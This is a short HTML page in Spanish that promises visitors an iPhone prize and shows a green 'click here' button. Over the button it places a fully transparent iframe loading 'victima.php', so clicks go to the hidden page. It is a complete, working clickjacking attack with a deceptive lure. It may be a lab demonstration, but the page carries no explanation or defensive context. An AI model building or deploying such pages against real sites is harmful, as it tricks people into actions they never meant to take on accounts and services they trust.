<!DOCTYPE html>
<html>
<head>
    <title>Gana un Premio 🎁</title>
    <style>
        body {
            margin: 0;
        }

        .contenedor {
            position: relative;
            width: 200px;
            height: 60px;
            margin: 100px auto;
        }

        .boton-falso {
            position: absolute;
            width: 200px;
            height: 60px;
            background: green;
            color: white;
            font-size: 18px;
            text-align: center;
            line-height: 60px;
            cursor: pointer;
            z-index: 1;
        }

        iframe {
            position: absolute;
            width: 200px;
            height: 60px;
            opacity: 0;
            z-index: 2;
            border: none;
        }
    </style>
</head>
<body>

<h2 style="text-align:center;">Haz clic para ganar un iPhone 📱</h2>

<div class="contenedor">
    <div class="boton-falso">Haz clic aquí</div>
    <iframe src="victima.php"></iframe>
</div>

</body>
</html>